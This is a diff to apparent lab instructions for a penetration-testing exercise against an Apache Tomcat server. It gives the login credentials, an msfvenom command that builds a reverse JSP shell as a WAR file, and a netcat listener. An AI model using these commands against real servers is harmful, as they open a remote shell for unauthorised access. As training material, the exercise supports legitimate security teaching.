@@ -1,9 +1,11 @@
 Part 1 - Find tomcat
 - use nmap, with default option and -sV to find the Tomcat server running
 
-Part 2 - Using nikto
-- run nikto against tomcat to find any vulnerabilities
+Part 2 - Log in
+- nikto can easily find the credentials but to save you time the username/password is: tomcat/gibson. WARNING: Please do not brute force this account as it will automatically lock everyone out. 
 
-Part 3 - Use any issues identified in part 2 to log on
+Part 3 - Get a reverse shell:
+- using metasploit generate a reverse JSP shell:
+- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell_<userid>.war
+- Listen with netcat: nc -lvp <port>
 
-BONUS: Using your skills try and get a reverse shell through tomcat
